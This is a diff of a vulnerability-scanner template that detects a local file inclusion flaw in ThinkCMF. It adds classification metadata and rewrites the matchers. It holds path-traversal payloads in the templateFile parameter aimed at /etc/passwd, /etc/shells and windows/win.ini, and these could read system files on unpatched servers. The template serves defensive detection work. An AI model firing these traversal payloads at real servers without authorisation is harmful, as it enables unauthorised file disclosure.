@@ -1,24 +1,37 @@
 id: thinkcmf-lfi
+
 info:
-  name: ThinkCMF LFI
-  author: pikpikcu
+  name: ThinkCMF - Local File Inclusion
+  author: 0x71rex
   severity: high
-  reference: https://www.freebuf.com/vuls/217586.html
+  description: ThinkCMF is vulnerable to local file inclusion.
+  reference:
+    - https://www.freebuf.com/vuls/217586.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+    win-payload: ../../../../../../../../../../../../../../../../windows/win.ini
+    unix-payload: ../../../../../../../../../../../../../../../../etc/shells
   tags: thinkcmf,lfi
-requests:
+
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?a=display&templateFile=README.md"
-      - "{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd"
-      - "{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini"
+
     matchers-condition: and
     matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0:"
-          - "\\[(font|extension|file)s\\]"
-          - 'ThinkCMF'
+      - type: word
+        words:
+          - "# valid login shells"
+          - "/bin/sh"
+          - "/bin/ash"
+          - "/bin/bash"
+          - "ThinkCMF"
+          - "## README"
+          - "## UPDATE"
+        condition: and
         part: body
-      - type: status
-        status:
-          - 200
